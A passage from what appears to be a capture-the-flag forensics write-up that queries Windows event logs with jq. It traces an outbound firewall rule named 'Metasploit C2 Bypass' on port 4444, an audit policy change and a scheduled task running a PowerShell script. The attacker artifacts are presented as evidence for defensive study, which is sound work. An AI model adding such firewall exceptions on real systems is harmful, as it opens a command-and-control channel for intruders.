</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (Echo Request - ICMPv6-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (Echo Request - ICMPv6-In)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (Echo Request - ICMPv4-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (Echo Request - ICMPv4-In)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (Spooler Service - RPC-EPMAP)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (Spooler Service - RPC)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (NB-Datagram-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (NB-Datagram-In)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (NB-Name-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (NB-Name-In)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (SMB-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (SMB-In)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (NB-Session-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (NB-Session-In)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Network Discovery (Pub WSD-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Network Discovery (Pub-WSD-In)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Network Discovery (LLMNR-UDP-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Network Discovery (LLMNR-UDP-In)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Network Discovery (WSD-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Network Discovery (WSD-In)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Network Discovery (WSD-In)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Network Discovery (UPnPHost-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Network Discovery (SSDP-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Network Discovery (SSDP-In)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Firefox (C:\\Program Files\\Mozilla Firefox)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Firefox (C:\\Program Files\\Mozilla Firefox)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;Metasploit C2 Bypass&#34;</span>
</span></span></code></pre></div><p>Here&rsquo;s the details of the malicious rule named added to the exception list.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat all_events.json | jq <span style="color:#f1fa8c">&#39;select(.Event.System.EventID==2004 and .Event.EventData.ModifyingUser==&#34;S-1-5-21-3393683511-3463148672-371912004-1001&#34; and .Event.EventData.RuleName==&#34;Metasploit C2 Bypass&#34;)&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Event&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;xmlns&#34;</span>: <span style="color:#f1fa8c">&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;EventData&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Action&#34;</span>: 3,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Active&#34;</span>: 1,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;ApplicationPath&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Direction&#34;</span>: 2,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EdgeTraversal&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EmbeddedContext&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Flags&#34;</span>: 1,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;LocalAddresses&#34;</span>: <span style="color:#f1fa8c">&#34;*&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;LocalOnlyMapped&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;LocalPorts&#34;</span>: <span style="color:#f1fa8c">&#34;*&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;LooseSourceMapped&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;ModifyingApplication&#34;</span>: <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\mmc.exe&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;ModifyingUser&#34;</span>: <span style="color:#f1fa8c">&#34;S-1-5-21-3393683511-3463148672-371912004-1001&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Origin&#34;</span>: 1,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Profiles&#34;</span>: 2147483647,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Protocol&#34;</span>: 6,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;RemoteAddresses&#34;</span>: <span style="color:#f1fa8c">&#34;*&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;RemoteMachineAuthorizationList&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;RemotePorts&#34;</span>: <span style="color:#f1fa8c">&#34;4444&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;RemoteUserAuthorizationList&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;RuleId&#34;</span>: <span style="color:#f1fa8c">&#34;{11309293-FB68-4969-93F9-7F75A9032570}&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;RuleName&#34;</span>: <span style="color:#f1fa8c">&#34;Metasploit C2 Bypass&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;RuleStatus&#34;</span>: 65536,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SchemaVersion&#34;</span>: 542,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SecurityOptions&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;ServiceName&#34;</span>: <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;System&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Channel&#34;</span>: <span style="color:#f1fa8c">&#34;Microsoft-Windows-Windows Firewall With Advanced Security/Firewall&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Computer&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-887GK2L&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Correlation&#34;</span>: null,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EventID&#34;</span>: 2004,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EventRecordID&#34;</span>: 1120,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Execution&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ProcessID&#34;</span>: 2384,
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ThreadID&#34;</span>: <span style="color:#bd93f9">2868</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Keywords&#34;</span>: <span style="color:#f1fa8c">&#34;0x8000020000000000&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Level&#34;</span>: 4,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Opcode&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Provider&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Guid&#34;</span>: <span style="color:#f1fa8c">&#34;D1BC9AFF-2ABF-4D71-9146-ECB2A986EB85&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Name&#34;</span>: <span style="color:#f1fa8c">&#34;Microsoft-Windows-Windows Firewall With Advanced Security&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Security&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;UserID&#34;</span>: <span style="color:#f1fa8c">&#34;S-1-5-19&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Task&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;TimeCreated&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;SystemTime&#34;</span>: <span style="color:#f1fa8c">&#34;2023-03-27T14:44:43.415702Z&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Version&#34;</span>: <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>The firewall rule&rsquo;s direction was set to &ldquo;2&rdquo; which means &ldquo;Outbound&rdquo;. So, I think &ldquo;1&rdquo; means &ldquo;Inbound&rdquo;? Unable to find documentation regarding the integer values.</p>
<p>Windows Policy Change Event ID is 4719:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat all_events.json | jq <span style="color:#f1fa8c">&#39;select(.Event.System.EventID==4719)&#39;</span>       
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Event&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;xmlns&#34;</span>: <span style="color:#f1fa8c">&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;EventData&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;AuditPolicyChanges&#34;</span>: <span style="color:#f1fa8c">&#34;%%8449&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;CategoryId&#34;</span>: <span style="color:#f1fa8c">&#34;%%8274&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SubcategoryGuid&#34;</span>: <span style="color:#f1fa8c">&#34;0CCE9227-69AE-11D9-BED3-505054503030&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SubcategoryId&#34;</span>: <span style="color:#f1fa8c">&#34;%%12804&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SubjectDomainName&#34;</span>: <span style="color:#f1fa8c">&#34;WORKGROUP&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SubjectLogonId&#34;</span>: <span style="color:#f1fa8c">&#34;0x3e7&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SubjectUserName&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-887GK2L</span>$<span style="color:#f1fa8c">&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SubjectUserSid&#34;</span>: <span style="color:#f1fa8c">&#34;S-1-5-18&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;System&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Channel&#34;</span>: <span style="color:#f1fa8c">&#34;Security&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Computer&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-887GK2L&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Correlation&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ActivityID&#34;</span>: <span style="color:#f1fa8c">&#34;986A053F-60B9-0002-5B05-6A98B960D901&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EventID&#34;</span>: 4719,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EventRecordID&#34;</span>: 13102,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Execution&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ProcessID&#34;</span>: 780,
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ThreadID&#34;</span>: <span style="color:#bd93f9">1488</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Keywords&#34;</span>: <span style="color:#f1fa8c">&#34;0x8020000000000000&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Level&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Opcode&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Provider&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Guid&#34;</span>: <span style="color:#f1fa8c">&#34;54849625-5478-4994-A5BA-3E3B0328C30D&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Name&#34;</span>: <span style="color:#f1fa8c">&#34;Microsoft-Windows-Security-Auditing&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Security&#34;</span>: null,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Task&#34;</span>: 13568,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;TimeCreated&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;SystemTime&#34;</span>: <span style="color:#f1fa8c">&#34;2023-03-27T14:50:03.721835Z&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Version&#34;</span>: <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>Searching the sub category&rsquo;s GUID yielded the result <code>Other Object Access Events</code>.</p>
<p>Finding Scheduled Task Creation Events by the user CyberJunkie</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat all_events.json | jq <span style="color:#f1fa8c">&#39;select(.Event.System.EventID==4698 and .Event.EventData.SubjectUserName==&#34;CyberJunkie&#34;)&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Event&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;xmlns&#34;</span>: <span style="color:#f1fa8c">&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;EventData&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;ClientProcessId&#34;</span>: 9320,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;ClientProcessStartKey&#34;</span>: 4222124650660162,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;FQDN&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-887GK2L&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;ParentProcessId&#34;</span>: 6112,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;RpcCallClientLocality&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SubjectDomainName&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-887GK2L&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SubjectLogonId&#34;</span>: <span style="color:#f1fa8c">&#34;0x25f28&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SubjectUserName&#34;</span>: <span style="color:#f1fa8c">&#34;CyberJunkie&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;SubjectUserSid&#34;</span>: <span style="color:#f1fa8c">&#34;S-1-5-21-3393683511-3463148672-371912004-1001&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;TaskContent&#34;</span>: <span style="color:#f1fa8c">&#34;&lt;?xml version=\&#34;1.0\&#34; encoding=\&#34;UTF-16\&#34;?&gt;\r\n&lt;Task version=\&#34;1.2\&#34; xmlns=\&#34;http://schemas.microsoft.com/windows/2004/02/mit/task\&#34;&gt;\r\n  &lt;RegistrationInfo&gt;\r\n    &lt;Date&gt;2023-03-27T07:51:21.4599985&lt;/Date&gt;\r\n    &lt;Author&gt;DESKTOP-887GK2L\\CyberJunkie&lt;/Author&gt;\r\n    &lt;Description&gt;practice&lt;/Description&gt;\r\n    &lt;URI&gt;\\HTB-AUTOMATION&lt;/URI&gt;\r\n  &lt;/RegistrationInfo&gt;\r\n  &lt;Triggers&gt;\r\n    &lt;CalendarTrigger&gt;\r\n      &lt;StartBoundary&gt;2023-03-27T09:00:00&lt;/StartBoundary&gt;\r\n      &lt;Enabled&gt;true&lt;/Enabled&gt;\r\n      &lt;ScheduleByDay&gt;\r\n        &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;\r\n      &lt;/ScheduleByDay&gt;\r\n    &lt;/CalendarTrigger&gt;\r\n  &lt;/Triggers&gt;\r\n  &lt;Principals&gt;\r\n    &lt;Principal id=\&#34;Author\&#34;&gt;\r\n      &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;\r\n      &lt;UserId&gt;DESKTOP-887GK2L\\CyberJunkie&lt;/UserId&gt;\r\n      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;\r\n    &lt;/Principal&gt;\r\n  &lt;/Principals&gt;\r\n  &lt;Settings&gt;\r\n    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;\r\n    &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;\r\n    &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;\r\n    &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;\r\n    &lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt;\r\n    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;\r\n    &lt;IdleSettings&gt;\r\n      &lt;Duration&gt;PT10M&lt;/Duration&gt;\r\n      &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;\r\n      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;\r\n      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;\r\n    &lt;/IdleSettings&gt;\r\n    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;\r\n    &lt;Enabled&gt;true&lt;/Enabled&gt;\r\n    &lt;Hidden&gt;false&lt;/Hidden&gt;\r\n    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;\r\n    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;\r\n    &lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;\r\n    &lt;Priority&gt;7&lt;/Priority&gt;\r\n  &lt;/Settings&gt;\r\n  &lt;Actions Context=\&#34;Author\&#34;&gt;\r\n    &lt;Exec&gt;\r\n      &lt;Command&gt;C:\\Users\\CyberJunkie\\Desktop\\Automation-HTB.ps1&lt;/Command&gt;\r\n      &lt;Arguments&gt;-A cyberjunkie@hackthebox.eu&lt;/Arguments&gt;\r\n    &lt;/Exec&gt;\r\n  &lt;/Actions&gt;\r\n&lt;/Task&gt;&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;TaskName&#34;</span>: <span style="color:#f1fa8c">&#34;\\HTB-AUTOMATION&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;System&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Channel&#34;</span>: <span style="color:#f1fa8c">&#34;Security&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Computer&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-887GK2L&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Correlation&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ActivityID&#34;</span>: <span style="color:#f1fa8c">&#34;986A053F-60B9-0002-5B05-6A98B960D901&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EventID&#34;</span>: 4698,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;EventRecordID&#34;</span>: 13103,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Execution&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ProcessID&#34;</span>: 780,
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;ThreadID&#34;</span>: <span style="color:#bd93f9">4180</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Keywords&#34;</span>: <span style="color:#f1fa8c">&#34;0x8020000000000000&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Level&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Opcode&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Provider&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Guid&#34;</span>: <span style="color:#f1fa8c">&#34;54849625-5478-4994-A5BA-3E3B0328C30D&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Name&#34;</span>: <span style="color:#f1fa8c">&#34;Microsoft-Windows-Security-Auditing&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Security&#34;</span>: null,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Task&#34;</span>: 12804,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;TimeCreated&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;#attributes&#34;</span>: <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;SystemTime&#34;</span>: <span style="color:#f1fa8c">&#34;2023-03-27T14:51:21.481720Z&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>,
